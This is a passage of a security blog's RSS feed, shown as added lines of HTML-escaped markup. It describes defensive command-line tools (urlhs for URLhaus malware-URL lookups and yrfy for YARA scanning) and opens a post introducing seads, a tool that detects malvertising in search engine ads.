+src="/js/fetch-repo.min.dc5533c50cefd50405344b235937142271f26229fe39cbee27fd4960e8bb897a0beebfad77a1091ca91cd0d1fb14e70fc37cc114dd9674fb2c32e0ab512ec8a4.js"
+integrity="sha512-3FUzxQzv1QQFNEsjWTcUInHyYin&amp;#43;OcvuJ/1JYOi7iXoL7r&amp;#43;td6EJHKkc0NH7FOcPw3zBFN2WdPssMuCrUS7IpA=="
+data-repo-url="https://api.github.com/repos/andpalmier/tfox"
+data-repo-id="github-d8f9c007e16436bf7e96a8617e4b651b"&gt;&lt;/script&gt;
+&lt;/a&gt;
+&lt;/div&gt;
+&lt;h3 class="relative group"&gt;Watch dangerous URLs with urlhs
+&lt;div id="watch-dangerous-urls-with-urlhs" class="anchor"&gt;&lt;/div&gt;
+&lt;span
+class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"&gt;
+&lt;a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#watch-dangerous-urls-with-urlhs" aria-label="Anchor"&gt;#&lt;/a&gt;
+&lt;/span&gt;
+&lt;/h3&gt;
+&lt;p&gt;&lt;a href="https://github.com/andpalmier/urlhs" target="_blank" rel="noreferrer"&gt;&lt;strong&gt;urlhs&lt;/strong&gt;&lt;/a&gt; connects to &lt;a href="https://urlhaus.abuse.ch" target="_blank" rel="noreferrer"&gt;&lt;strong&gt;URLhaus&lt;/strong&gt;&lt;/a&gt;, which aggregates malware distribution URLs.&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;When could it be useful?&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;When you need to block malware-serving URLs or track current malware distribution trends.&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Example:&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;Discovery of recent payload URLs:&lt;/p&gt;
+&lt;div class="highlight-wrapper"&gt;&lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;urlhs recent -payloads -limit &lt;span class="m"&gt;10&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;div class="github-card-wrapper"&gt;
+&lt;a id="github-ea8e8b40cf9b52637a98819503a14716" target="_blank" href="https://github.com/andpalmier/urlhs" class="cursor-pointer"&gt;
+&lt;div
+class="w-full md:w-auto p-0 m-0 border border-neutral-200 dark:border-neutral-700 border rounded-md shadow-2xl"&gt;&lt;div class="w-full nozoom"&gt;
+&lt;img
+src="https://opengraph.githubassets.com/0/andpalmier/urlhs"
+alt="GitHub Repository Thumbnail"
+class="nozoom mt-0 mb-0 w-full h-full object-cover"&gt;
+&lt;/div&gt;&lt;div class="w-full md:w-auto pt-3 p-5"&gt;
+&lt;div class="flex items-center"&gt;
+&lt;span class="text-2xl text-neutral-800 dark:text-neutral me-2"&gt;
+&lt;span class="relative block icon"&gt;&lt;svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"&gt;&lt;path fill="currentColor" d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"/&gt;&lt;/svg&gt;
+&lt;/span&gt;
+&lt;/span&gt;
+&lt;div
+id="github-ea8e8b40cf9b52637a98819503a14716-full_name"
+class="m-0 font-bold text-xl text-neutral-800 decoration-primary-500 hover:underline hover:underline-offset-2 dark:text-neutral"&gt;
+andpalmier/urlhs
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;p id="github-ea8e8b40cf9b52637a98819503a14716-description" class="m-0 mt-2 text-md text-neutral-800 dark:text-neutral"&gt;
+CLI tool to search in URLhaus database and submit URLs
+&lt;/p&gt;
+&lt;div class="m-0 mt-2 flex items-center"&gt;
+&lt;span class="mr-1 inline-block h-3 w-3 rounded-full language-dot" data-language="Go"&gt;&lt;/span&gt;
+&lt;div class="m-0 mr-5 text-md text-neutral-800 dark:text-neutral"&gt;
+Go
+&lt;/div&gt;
+&lt;span class="text-md mr-1 text-neutral-800 dark:text-neutral"&gt;
+&lt;span class="relative block icon"&gt;&lt;svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 576 512"&gt;&lt;path fill="currentColor" d="M287.9 0C297.1 0 305.5 5.25 309.5 13.52L378.1 154.8L531.4 177.5C540.4 178.8 547.8 185.1 550.7 193.7C553.5 202.4 551.2 211.9 544.8 218.2L433.6 328.4L459.9 483.9C461.4 492.9 457.7 502.1 450.2 507.4C442.8 512.7 432.1 513.4 424.9 509.1L287.9 435.9L150.1 509.1C142.9 513.4 133.1 512.7 125.6 507.4C118.2 502.1 114.5 492.9 115.1 483.9L142.2 328.4L31.11 218.2C24.65 211.9 22.36 202.4 25.2 193.7C28.03 185.1 35.5 178.8 44.49 177.5L197.7 154.8L266.3 13.52C270.4 5.249 278.7 0 287.9 0L287.9 0zM287.9 78.95L235.4 187.2C231.9 194.3 225.1 199.3 217.3 200.5L98.98 217.9L184.9 303C190.4 308.5 192.9 316.4 191.6 324.1L171.4 443.7L276.6 387.5C283.7 383.7 292.2 383.7 299.2 387.5L404.4 443.7L384.2 324.1C382.9 316.4 385.5 308.5 391 303L476.9 217.9L358.6 200.5C350.7 199.3 343.9 194.3 340.5 187.2L287.9 78.95z"/&gt;&lt;/svg&gt;&lt;/span&gt;
+&lt;/span&gt;
+&lt;div id="github-ea8e8b40cf9b52637a98819503a14716-stargazers" class="m-0 mr-5 text-md text-neutral-800 dark:text-neutral"&gt;
+1
+&lt;/div&gt;
+&lt;span class="text-md mr-1 text-neutral-800 dark:text-neutral"&gt;
+&lt;span class="relative block icon"&gt;&lt;svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"&gt;&lt;path fill="currentColor" d="M80 104c13.3 0 24-10.7 24-24s-10.7-24-24-24S56 66.7 56 80s10.7 24 24 24zm80-24c0 32.8-19.7 61-48 73.3V192c0 17.7 14.3 32 32 32H304c17.7 0 32-14.3 32-32V153.3C307.7 141 288 112.8 288 80c0-44.2 35.8-80 80-80s80 35.8 80 80c0 32.8-19.7 61-48 73.3V192c0 53-43 96-96 96H256v70.7c28.3 12.3 48 40.5 48 73.3c0 44.2-35.8 80-80 80s-80-35.8-80-80c0-32.8 19.7-61 48-73.3V288H144c-53 0-96-43-96-96V153.3C19.7 141 0 112.8 0 80C0 35.8 35.8 0 80 0s80 35.8 80 80zm208 24c13.3 0 24-10.7 24-24s-10.7-24-24-24s-24 10.7-24 24s10.7 24 24 24zM248 432c0-13.3-10.7-24-24-24s-24 10.7-24 24s10.7 24 24 24s24-10.7 24-24z"/&gt;&lt;/svg&gt;&lt;/span&gt;
+&lt;/span&gt;
+&lt;div id="github-ea8e8b40cf9b52637a98819503a14716-forks" class="m-0 mr-5 text-md text-neutral-800 dark:text-neutral"&gt;
+0
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;script
+async
+type="text/javascript"
+src="/js/fetch-repo.min.dc5533c50cefd50405344b235937142271f26229fe39cbee27fd4960e8bb897a0beebfad77a1091ca91cd0d1fb14e70fc37cc114dd9674fb2c32e0ab512ec8a4.js"
+integrity="sha512-3FUzxQzv1QQFNEsjWTcUInHyYin&amp;#43;OcvuJ/1JYOi7iXoL7r&amp;#43;td6EJHKkc0NH7FOcPw3zBFN2WdPssMuCrUS7IpA=="
+data-repo-url="https://api.github.com/repos/andpalmier/urlhs"
+data-repo-id="github-ea8e8b40cf9b52637a98819503a14716"&gt;&lt;/script&gt;
+&lt;/a&gt;
+&lt;/div&gt;
+&lt;h3 class="relative group"&gt;Easy scans with yrfy
+&lt;div id="easy-scans-with-yrfy" class="anchor"&gt;&lt;/div&gt;
+&lt;span
+class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"&gt;
+&lt;a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#easy-scans-with-yrfy" aria-label="Anchor"&gt;#&lt;/a&gt;
+&lt;/span&gt;
+&lt;/h3&gt;
+&lt;p&gt;&lt;a href="https://github.com/andpalmier/yrfy" target="_blank" rel="noreferrer"&gt;&lt;strong&gt;yrfy&lt;/strong&gt;&lt;/a&gt; leverages &lt;a href="https://yaraify.abuse.ch" target="_blank" rel="noreferrer"&gt;&lt;strong&gt;YARAify&lt;/strong&gt;&lt;/a&gt; to scan files against a repository of community &lt;a href="/posts/cti-interview-preparation/#yara" &gt;YARA rules&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;When could it be useful?&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;If you need to analyze a suspicious binary without uploading it to VirusTotal, or check for matches against community rules.&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Example:&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;Scanning a local file:&lt;/p&gt;
+&lt;div class="highlight-wrapper"&gt;&lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;yrfy scan -file suspect_installer.exe&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;It can even unpack the file prior to scanning if the &lt;code&gt;-unpack&lt;/code&gt; flag is used!&lt;/p&gt;
+&lt;div class="github-card-wrapper"&gt;
+&lt;a id="github-4c68c02e6aa2fe265447c6c21d000bec" target="_blank" href="https://github.com/andpalmier/yrfy" class="cursor-pointer"&gt;
+&lt;div
+class="w-full md:w-auto p-0 m-0 border border-neutral-200 dark:border-neutral-700 border rounded-md shadow-2xl"&gt;&lt;div class="w-full nozoom"&gt;
+&lt;img
+src="https://opengraph.githubassets.com/0/andpalmier/yrfy"
+alt="GitHub Repository Thumbnail"
+class="nozoom mt-0 mb-0 w-full h-full object-cover"&gt;
+&lt;/div&gt;&lt;div class="w-full md:w-auto pt-3 p-5"&gt;
+&lt;div class="flex items-center"&gt;
+&lt;span class="text-2xl text-neutral-800 dark:text-neutral me-2"&gt;
+&lt;span class="relative block icon"&gt;&lt;svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"&gt;&lt;path fill="currentColor" d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"/&gt;&lt;/svg&gt;
+&lt;/span&gt;
+&lt;/span&gt;
+&lt;div
+id="github-4c68c02e6aa2fe265447c6c21d000bec-full_name"
+class="m-0 font-bold text-xl text-neutral-800 decoration-primary-500 hover:underline hover:underline-offset-2 dark:text-neutral"&gt;
+andpalmier/yrfy
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;p id="github-4c68c02e6aa2fe265447c6c21d000bec-description" class="m-0 mt-2 text-md text-neutral-800 dark:text-neutral"&gt;
+CLI tool to interact with YARAify API
+&lt;/p&gt;
+&lt;div class="m-0 mt-2 flex items-center"&gt;
+&lt;span class="mr-1 inline-block h-3 w-3 rounded-full language-dot" data-language="Go"&gt;&lt;/span&gt;
+&lt;div class="m-0 mr-5 text-md text-neutral-800 dark:text-neutral"&gt;
+Go
+&lt;/div&gt;
+&lt;span class="text-md mr-1 text-neutral-800 dark:text-neutral"&gt;
+&lt;span class="relative block icon"&gt;&lt;svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 576 512"&gt;&lt;path fill="currentColor" d="M287.9 0C297.1 0 305.5 5.25 309.5 13.52L378.1 154.8L531.4 177.5C540.4 178.8 547.8 185.1 550.7 193.7C553.5 202.4 551.2 211.9 544.8 218.2L433.6 328.4L459.9 483.9C461.4 492.9 457.7 502.1 450.2 507.4C442.8 512.7 432.1 513.4 424.9 509.1L287.9 435.9L150.1 509.1C142.9 513.4 133.1 512.7 125.6 507.4C118.2 502.1 114.5 492.9 115.1 483.9L142.2 328.4L31.11 218.2C24.65 211.9 22.36 202.4 25.2 193.7C28.03 185.1 35.5 178.8 44.49 177.5L197.7 154.8L266.3 13.52C270.4 5.249 278.7 0 287.9 0L287.9 0zM287.9 78.95L235.4 187.2C231.9 194.3 225.1 199.3 217.3 200.5L98.98 217.9L184.9 303C190.4 308.5 192.9 316.4 191.6 324.1L171.4 443.7L276.6 387.5C283.7 383.7 292.2 383.7 299.2 387.5L404.4 443.7L384.2 324.1C382.9 316.4 385.5 308.5 391 303L476.9 217.9L358.6 200.5C350.7 199.3 343.9 194.3 340.5 187.2L287.9 78.95z"/&gt;&lt;/svg&gt;&lt;/span&gt;
+&lt;/span&gt;
+&lt;div id="github-4c68c02e6aa2fe265447c6c21d000bec-stargazers" class="m-0 mr-5 text-md text-neutral-800 dark:text-neutral"&gt;
+1
+&lt;/div&gt;
+&lt;span class="text-md mr-1 text-neutral-800 dark:text-neutral"&gt;
+&lt;span class="relative block icon"&gt;&lt;svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"&gt;&lt;path fill="currentColor" d="M80 104c13.3 0 24-10.7 24-24s-10.7-24-24-24S56 66.7 56 80s10.7 24 24 24zm80-24c0 32.8-19.7 61-48 73.3V192c0 17.7 14.3 32 32 32H304c17.7 0 32-14.3 32-32V153.3C307.7 141 288 112.8 288 80c0-44.2 35.8-80 80-80s80 35.8 80 80c0 32.8-19.7 61-48 73.3V192c0 53-43 96-96 96H256v70.7c28.3 12.3 48 40.5 48 73.3c0 44.2-35.8 80-80 80s-80-35.8-80-80c0-32.8 19.7-61 48-73.3V288H144c-53 0-96-43-96-96V153.3C19.7 141 0 112.8 0 80C0 35.8 35.8 0 80 0s80 35.8 80 80zm208 24c13.3 0 24-10.7 24-24s-10.7-24-24-24s-24 10.7-24 24s10.7 24 24 24zM248 432c0-13.3-10.7-24-24-24s-24 10.7-24 24s10.7 24 24 24s24-10.7 24-24z"/&gt;&lt;/svg&gt;&lt;/span&gt;
+&lt;/span&gt;
+&lt;div id="github-4c68c02e6aa2fe265447c6c21d000bec-forks" class="m-0 mr-5 text-md text-neutral-800 dark:text-neutral"&gt;
+1
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;script
+async
+type="text/javascript"
+src="/js/fetch-repo.min.dc5533c50cefd50405344b235937142271f26229fe39cbee27fd4960e8bb897a0beebfad77a1091ca91cd0d1fb14e70fc37cc114dd9674fb2c32e0ab512ec8a4.js"
+integrity="sha512-3FUzxQzv1QQFNEsjWTcUInHyYin&amp;#43;OcvuJ/1JYOi7iXoL7r&amp;#43;td6EJHKkc0NH7FOcPw3zBFN2WdPssMuCrUS7IpA=="
+data-repo-url="https://api.github.com/repos/andpalmier/yrfy"
+data-repo-id="github-4c68c02e6aa2fe265447c6c21d000bec"&gt;&lt;/script&gt;
+&lt;/a&gt;
+&lt;/div&gt;
+&lt;h2 class="relative group"&gt;Conclusion
+&lt;div id="conclusion" class="anchor"&gt;&lt;/div&gt;
+&lt;span
+class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"&gt;
+&lt;a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#conclusion" aria-label="Anchor"&gt;#&lt;/a&gt;
+&lt;/span&gt;
+&lt;/h2&gt;
+&lt;p&gt;The cyber security industry is full of services providing complex dashboards and enterprise subscriptions, but - sometimes - the most efficient path is a simple &lt;code&gt;grep&lt;/code&gt; for a hash, or a quick bash loop to check a list of domains. This toolset was built for those moments: every tool is fast, scriptable, and respectful of system resources.&lt;/p&gt;
+&lt;p&gt;These projects are all open source (AGPLv3) and contributions are more than welcome, Happy hunting!&lt;/p&gt;</description></item><item><title>Adventures in Ad-Land: detect malvertising with seads</title><link>/posts/seads/</link><pubDate>Fri, 08 Mar 2024 00:00:00 +0000</pubDate><guid>/posts/seads/</guid><description>
+&lt;div
+class="flex px-4 py-3 rounded-md shadow bg-primary-100 dark:bg-primary-900"
+&gt;
+&lt;span
+class="text-primary-400 pe-3 flex items-center"
+&gt;
+&lt;span class="relative block icon"&gt;&lt;svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"&gt;&lt;path fill="currentColor" d="M256 0C114.6 0 0 114.6 0 256s114.6 256 256 256s256-114.6 256-256S397.4 0 256 0zM256 128c17.67 0 32 14.33 32 32c0 17.67-14.33 32-32 32S224 177.7 224 160C224 142.3 238.3 128 256 128zM296 384h-80C202.8 384 192 373.3 192 360s10.75-24 24-24h16v-64H224c-13.25 0-24-10.75-24-24S210.8 224 224 224h32c13.25 0 24 10.75 24 24v88h16c13.25 0 24 10.75 24 24S309.3 384 296 384z"/&gt;&lt;/svg&gt;
+&lt;/span&gt;
+&lt;/span&gt;
+&lt;span
+class="dark:text-neutral-300"
+&gt;The following paragraph was added on June 15, 2024. The rest of the blog remains unchanged from its original publication on March 8, 2024.&lt;/span&gt;
+&lt;/div&gt;
+&lt;p&gt;&lt;em&gt;Thanks to the incredible feedback from the community on&lt;/em&gt; &lt;code&gt;seads&lt;/code&gt;&lt;em&gt;, I am working on updates and developing new features. As a result, this blog post seems somewhat outdated, and it doesn&amp;rsquo;t cover some of the new features the project now includes, such as setting a custom user agent string for clicking on ads or printing the redirect chain of identified ads. I will keep this blog post as a reference, but I encourage readers to check out the GitHub page of the project:&lt;/em&gt;&lt;/p&gt;
+&lt;div class="github-card-wrapper"&gt;
+&lt;a id="github-3da39898bef90742ba6c0424ed686a76" target="_blank" href="https://github.com/andpalmier/seads" class="cursor-pointer"&gt;
+&lt;div
+class="w-full md:w-auto p-0 m-0 border border-neutral-200 dark:border-neutral-700 border rounded-md shadow-2xl"&gt;&lt;div class="w-full nozoom"&gt;
+&lt;img
+src="https://opengraph.githubassets.com/0/andpalmier/seads"
+alt="GitHub Repository Thumbnail"
+class="nozoom mt-0 mb-0 w-full h-full object-cover"&gt;
+&lt;/div&gt;&lt;div class="w-full md:w-auto pt-3 p-5"&gt;
+&lt;div class="flex items-center"&gt;
+&lt;span class="text-2xl text-neutral-800 dark:text-neutral me-2"&gt;
+&lt;span class="relative block icon"&gt;&lt;svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"&gt;&lt;path fill="currentColor" d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"/&gt;&lt;/svg&gt;
+&lt;/span&gt;
+&lt;/span&gt;
+&lt;div
+id="github-3da39898bef90742ba6c0424ed686a76-full_name"
+class="m-0 font-bold text-xl text-neutral-800 decoration-primary-500 hover:underline hover:underline-offset-2 dark:text-neutral"&gt;
+andpalmier/seads
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;p id="github-3da39898bef90742ba6c0424ed686a76-description" class="m-0 mt-2 text-md text-neutral-800 dark:text-neutral"&gt;
+Search Engines ADs scanner - spotting malvertising in search engines has never been easier!
+&lt;/p&gt;
+&lt;div class="m-0 mt-2 flex items-center"&gt;
+&lt;span class="mr-1 inline-block h-3 w-3 rounded-full language-dot" data-language="Go"&gt;&lt;/span&gt;
+&lt;div class="m-0 mr-5 text-md text-neutral-800 dark:text-neutral"&gt;
+Go
+&lt;/div&gt;
+&lt;span class="text-md mr-1 text-neutral-800 dark:text-neutral"&gt;
+&lt;span class="relative block icon"&gt;&lt;svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 576 512"&gt;&lt;path fill="currentColor" d="M287.9 0C297.1 0 305.5 5.25 309.5 13.52L378.1 154.8L531.4 177.5C540.4 178.8 547.8 185.1 550.7 193.7C553.5 202.4 551.2 211.9 544.8 218.2L433.6 328.4L459.9 483.9C461.4 492.9 457.7 502.1 450.2 507.4C442.8 512.7 432.1 513.4 424.9 509.1L287.9 435.9L150.1 509.1C142.9 513.4 133.1 512.7 125.6 507.4C118.2 502.1 114.5 492.9 115.1 483.9L142.2 328.4L31.11 218.2C24.65 211.9 22.36 202.4 25.2 193.7C28.03 185.1 35.5 178.8 44.49 177.5L197.7 154.8L266.3 13.52C270.4 5.249 278.7 0 287.9 0L287.9 0zM287.9 78.95L235.4 187.2C231.9 194.3 225.1 199.3 217.3 200.5L98.98 217.9L184.9 303C190.4 308.5 192.9 316.4 191.6 324.1L171.4 443.7L276.6 387.5C283.7 383.7 292.2 383.7 299.2 387.5L404.4 443.7L384.2 324.1C382.9 316.4 385.5 308.5 391 303L476.9 217.9L358.6 200.5C350.7 199.3 343.9 194.3 340.5 187.2L287.9 78.95z"/&gt;&lt;/svg&gt;&lt;/span&gt;
+&lt;/span&gt;
+&lt;div id="github-3da39898bef90742ba6c0424ed686a76-stargazers" class="m-0 mr-5 text-md text-neutral-800 dark:text-neutral"&gt;
+44
+&lt;/div&gt;
+&lt;span class="text-md mr-1 text-neutral-800 dark:text-neutral"&gt;
+&lt;span class="relative block icon"&gt;&lt;svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"&gt;&lt;path fill="currentColor" d="M80 104c13.3 0 24-10.7 24-24s-10.7-24-24-24S56 66.7 56 80s10.7 24 24 24zm80-24c0 32.8-19.7 61-48 73.3V192c0 17.7 14.3 32 32 32H304c17.7 0 32-14.3 32-32V153.3C307.7 141 288 112.8 288 80c0-44.2 35.8-80 80-80s80 35.8 80 80c0 32.8-19.7 61-48 73.3V192c0 53-43 96-96 96H256v70.7c28.3 12.3 48 40.5 48 73.3c0 44.2-35.8 80-80 80s-80-35.8-80-80c0-32.8 19.7-61 48-73.3V288H144c-53 0-96-43-96-96V153.3C19.7 141 0 112.8 0 80C0 35.8 35.8 0 80 0s80 35.8 80 80zm208 24c13.3 0 24-10.7 24-24s-10.7-24-24-24s-24 10.7-24 24s10.7 24 24 24zM248 432c0-13.3-10.7-24-24-24s-24 10.7-24 24s10.7 24 24 24s24-10.7 24-24z"/&gt;&lt;/svg&gt;&lt;/span&gt;
+&lt;/span&gt;
+&lt;div id="github-3da39898bef90742ba6c0424ed686a76-forks" class="m-0 mr-5 text-md text-neutral-800 dark:text-neutral"&gt;
+3
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;script
+async
+type="text/javascript"
+src="/js/fetch-repo.min.dc5533c50cefd50405344b235937142271f26229fe39cbee27fd4960e8bb897a0beebfad77a1091ca91cd0d1fb14e70fc37cc114dd9674fb2c32e0ab512ec8a4.js"
+integrity="sha512-3FUzxQzv1QQFNEsjWTcUInHyYin&amp;#43;OcvuJ/1JYOi7iXoL7r&amp;#43;td6EJHKkc0NH7FOcPw3zBFN2WdPssMuCrUS7IpA=="
+data-repo-url="https://api.github.com/repos/andpalmier/seads"
+data-repo-id="github-3da39898bef90742ba6c0424ed686a76"&gt;&lt;/script&gt;
+&lt;/a&gt;
+&lt;/div&gt;
+&lt;hr&gt;
+&lt;p&gt;This post is about a handy tool I developed called &lt;code&gt;seads&lt;/code&gt;, which helps detecting malvertising on search engines. Here is the &lt;a href="https://www.github.com/andpalmier/seads" target="_blank" rel="noreferrer"&gt;GitHub repository&lt;/a&gt;, if you have ideas or feedback related to this project, feel free to reach out!&lt;/p&gt;
